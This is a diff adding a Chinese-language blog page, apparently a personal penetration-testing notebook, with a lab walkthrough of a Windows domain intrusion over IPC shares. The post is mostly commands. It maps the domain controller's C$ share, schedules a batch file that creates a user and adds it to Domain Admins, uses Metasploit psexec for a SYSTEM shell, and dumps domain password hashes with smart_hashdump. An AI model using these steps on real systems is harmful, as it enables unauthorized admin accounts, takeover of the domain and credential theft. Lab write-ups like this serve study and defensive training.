@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>域渗透(IPC入侵) | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">域渗透(IPC入侵)</h2>
+            <div class="post-date">2020-01-02</div>
+            
+            <div class="post-content">
+              <p><strong>环境</strong><br>
+Server08R2<br>
+kali</p>
+<!-- more -->
+<p><strong>步骤</strong><br>
+IPC经典入侵手法，反弹meterpreter<br>
+Getsystem权限<br>
+<img src="https://guokeya.github.io/post-images/1577951104537.png" alt="" loading="lazy"></p>
+<pre><code>net use \\域控IP\c$
+net time \\域控IP
+copy bat.bat \\域控IP\c$
+at \\域控IP 时间 c:\bat.bat
+</code></pre>
+<p>bat.bat内容如下</p>
+<pre><code>net user demo deo /ad /domain
+net group &quot;domain admins&quot; demo /ad/domain
+</code></pre>
+<p>tips:如果运行SMB服务的用户不是管理员用户，那么将没有权限执行创建用户等命令<br>
+此时，我们用msf来返回一个shell</p>
+<pre><code>use exploit/windows/smb/psexec
+set RHOSTS 192.168.52.138
+set SMBUser 创建的用户
+set SMBPass 用户密码
+set SMBDomain  域名称
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577951133729.png" alt="" loading="lazy"><br>
+查看下权限,已经是system权限<br>
+<img src="https://guokeya.github.io/post-images/1577951152418.png" alt="" loading="lazy"><br>
+获取所有用户的hash<br>
+smart_hashdump可以用来导出域用户的hash<br>
+powershell,有直接导出的模块<br>
+mimikatz等神器的使用<br>
+在这里，我使用smart_hashdump模块，这里必须是system权限</p>
+<pre><code>use post/windows/gather/smart_hashdump
+set SESSION 2
+exploit
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1577951162994.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/EfzSPkBWE/" class="tag">
+                    渗透测试
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/ZqSGl-Pm7/">
+                  <h3 class="post-title">
+                    DNScat2使用
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
